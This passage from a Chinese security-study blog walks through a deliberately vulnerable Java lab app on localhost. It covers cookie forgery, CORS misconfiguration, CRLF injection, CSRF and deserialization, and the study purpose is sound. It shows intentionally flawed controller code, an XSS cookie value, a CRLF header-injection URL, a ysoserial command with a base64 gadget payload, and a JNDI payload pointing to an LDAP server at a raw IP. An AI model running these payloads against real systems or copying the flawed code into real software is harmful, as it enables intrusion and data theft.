&quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>vuln01</p><p><a href="http://127.0.0.1:8081/cookie/vuln01">http://127.0.0.1:8081/cookie/vuln01</a></p><p>抓包改 cookie，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">nick</span>=admin;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930981.png" alt="20250723141110105"></p><p>vuln02</p><p>同 vuln01</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931435.png" alt="20250723141320799"></p><p>vuln03</p><p>因为大小写敏感，所以要写准确的 nick</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931594.png" alt="20250723141512271"></p><p>如果不是全小写，就会被拦截</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931715.png" alt="20250723141532175"></p><p>vuln04</p><p>不区分大小写，</p><p>vuln05</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 伪造一个 nick=admin 的 Cookie</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=admin; path=/&quot;</span>;<br><br><span class="hljs-comment">// 发送请求，获取接口返回</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln05&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png" alt="20250723142428662"></p><p>vuln06</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931560.png" alt="20250723142510453"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=&lt;script&gt;alert(1)&lt;/script&gt;; path=/&quot;</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln06&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png"></p><h2 id="Cors"><a href="#Cors" class="headerlink" title="Cors"></a>Cors</h2><blockquote><p>跨域资源共享 CORS 详解</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><h4 id="原理与工作流程"><a href="#原理与工作流程" class="headerlink" title="原理与工作流程"></a>原理与工作流程</h4><p>CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。</p><p>CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。</p><p>相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。</p><p>CORS具体工作流程可分为三步，</p><ol><li>资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源；</li><li>浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许；</li></ol><h4 id="CORS与CSRF的区别"><a href="#CORS与CSRF的区别" class="headerlink" title="CORS与CSRF的区别"></a>CORS与CSRF的区别</h4><p>一般有CORS漏洞的地方都有CSRF。</p><p>CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</p><p>浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。</p><p>相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。</p><p>不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</p><p>由于代码限制不严格，会导致跨域请求伪造可以结合xss，csrf进行攻击</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cors.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cors&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cors</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/origin&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls1</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;origin&quot;</span>);<br>        <span class="hljs-comment">//后端无验证，直接将前端传来的 origin 反射回去，没有判断这个 origin 是否合法</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class="hljs-comment">// set origin from header</span><br>        <span class="hljs-comment">//可以在跨域请求中携带 Cookie / Session / Authorization 这些身份凭证</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);  <span class="hljs-comment">// allow cookie</span><br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls2</span><span class="hljs-params">(HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">// 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>);<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); //任意网站都可以访问本网站</code></p><p><code>response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  //允许这些任意网站带上用户的 Cookie 来访问本网站</code></p><p>这俩个头一起用就导致攻击者可以构造任意恶意网页，从任意网站带上 Cookie 访问本网站，获取到用户数据，造成数据泄露。</p><p><strong>漏洞利用：</strong></p><p>攻击者从 <code>evil.com</code> 发起跨域请求（使用前端脚本携带 Cookie 向另一个子域发请求），诱导已经在 <code>http://127.0.0.1:8081</code> 网站上登录的用户访问  <code>evil.com</code> ，而由于服务端设置了<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</code>，所以当攻击者访问 <code>http://127.0.0.1:8081/cors/vuln/origin</code> 页面，服务端无过滤就会响应，使得攻击者拿到敏感信息。</p><p>cors复现: <a href="https://blog.csdn.net/wanmiqi/article/details/119573354">https://blog.csdn.net/wanmiqi/article/details/119573354</a></p><h2 id="CRLFInjection"><a href="#CRLFInjection" class="headerlink" title="CRLFInjection"></a>CRLFInjection</h2><blockquote><p>初识HTTP响应拆分攻击（CRLF Injection）</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CRLF 指的是<strong>回车符</strong>（CR，ASCII 13，\r，%0d）和<strong>换行符</strong>（LF，ASCII 10，\n，%0a）的简称（\r\n）。在《<a href="http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247483836&idx=1&sn=1b1ccd6f196c87b7f3bf4b1c585d9d9e&chksm=fc981e36cbef972043707782aaa968ba94a960adba855a35afc5e896edeb2160d513ab1667cf&scene=21#wechat_redirect">HTTP | HTTP报文</a>》一文中，我们可以了解到HTTP报文的结构：HTTP报文以状态行开始，跟在后面的是HTTP首部（HTTP Header），首部由多个首部字段构成，每行一个首部字段，HTTP首部后是一个空行，然后是报文主体（HTTP Body）。状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部中每个首部字段以一个CRLF分隔，首部和主体由两个CRLF分隔。</p><p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p><p>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CRLFInjection.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/crlf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CRLFInjection</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/safecode&quot;)</span><br>    <span class="hljs-comment">//表示该方法直接将返回结果写入 HTTP 响应体中</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-comment">//接收 HttpServletRequest request: 客户端发来的请求对象，HttpServletResponse response: 用于构造响应返回给客户端。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">crlf</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">//将用户传入的 test1 作为值添加到响应头中</span><br>        response.addHeader(<span class="hljs-string">&quot;test1&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test1&quot;</span>));<br>        <span class="hljs-comment">//设置 test2 响应头为请求参数 test2 的值。如果该 header 已存在，将被覆盖</span><br>        response.setHeader(<span class="hljs-string">&quot;test2&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test2&quot;</span>));<br>        <span class="hljs-comment">//获取参数 test3 的值，赋给 author</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;test3&quot;</span>);<br>        <span class="hljs-comment">//创建一个新的 Cookie，名为 test3，值为 author</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;test3&quot;</span>, author);<br>        <span class="hljs-comment">//将该 Cookie 添加到响应头中</span><br>        response.addCookie(cookie);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>构造POC：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/crlf/safecode?test<span class="hljs-number">1</span><span class="hljs-operator">=</span>abc<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ASet-Cookie:<span class="hljs-variable">%20</span>evil<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>正常来讲应该看到一个新的标头</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Set-Cookie: <span class="hljs-attribute">evil</span>=1<br></code></pre></td></tr></table></figure><p>我这里没有复现成功，可能是因为 tomcat 版本高自动过滤了 <code>\r\n</code> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933198.png" alt="20250723161852286"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRF漏洞原理攻击与防御（非常细）-CSDN博客</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933314.jpeg" alt="20250724095137238"></p><p>所以要被CSRF攻击，必须同时满足两个条件：</p><ul><li>登录受信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CSRF</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/post&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">post</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CSRF passed.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Deserialize"><a href="#Deserialize" class="headerlink" title="Deserialize"></a>Deserialize</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> org.joychou.config.Constants;<br><span class="hljs-keyword">import</span> org.joychou.security.AntObjectInputStream;<br><span class="hljs-keyword">import</span> org.slf4j.Logger;<br><span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InvalidClassException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Deserialize RCE using Commons-Collections gadget.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> JoyChou @2018-06-14</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Deserialize</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64 &lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/vuln&quot;&gt;http://localhost:8080/deserialize/rememberMe/vuln&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeVul</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//从请求中读取 rememberMe cookie</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//将 rememberMe cookie 中 Base64 编码的数据进行解码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-comment">//将 byte[] 包装成字节输入流</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br>        <span class="hljs-comment">//构造 ObjectInputStream 对象，从流中读取对象，</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        <span class="hljs-comment">//读取字节流中的对象，进行反序列化，若 cookie 中包含恶意类，将被执行</span><br>        in.readObject();<br>        in.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Are u ok?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Check deserialize class using black list. &lt;br&gt;</span><br><span class="hljs-comment">     * Or update commons-collections to 3.2.2 or above.Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons.To enable it set system property &#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27; to &#x27;true&#x27;,but you must ensure that your application does not de-serialize objects from untrusted sources.&lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/security&quot;&gt;http://localhost:8080/deserialize/rememberMe/security&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//黑名单过滤</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/security&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeBlackClassCheck</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br><br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//使用自定义 AntObjectInputStream 类进行反序列化。该类内部通过黑名单机制禁止一些已知的恶意类</span><br>            <span class="hljs-type">AntObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntObjectInputStream</span>(bytes);  <span class="hljs-comment">// throw InvalidClassException</span><br>            in.readObject();<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidClassException e) &#123;<br>            logger.info(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m very OK.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// String payload = &quot;[\&quot;org.jsecurity.realm.jndi.JndiRealmFactory\&quot;, &#123;\&quot;jndiNames\&quot;:\&quot;ldap://30.196.97.50:1389/yto8pc\&quot;&#125;]&quot;;</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/jackson&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Jackson</span><span class="hljs-params">(String payload)</span> &#123;<br>        <span class="hljs-comment">//ObjectMapper 是 Jackson 提供的 JSON 解析器</span><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//反序列化用户输入的 JSON </span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> mapper.readValue(payload, Object.class);<br>            mapper.writeValueAsString(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>ysoserial.jar 生成 payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">路由：<br>/deserialize/rememberMe/vuln<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Windows：<br><br>java -jar ~<span class="hljs-string">/ysoserial.jar</span> CommonsCollections5 calc | base64<br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YW<span class="hljs-keyword">ls</span>TWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dG<span class="hljs-keyword">ls</span>LkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dG<span class="hljs-keyword">ls</span>L0NvbGxlY3Rpb247eHBzcgATamF2YS51dG<span 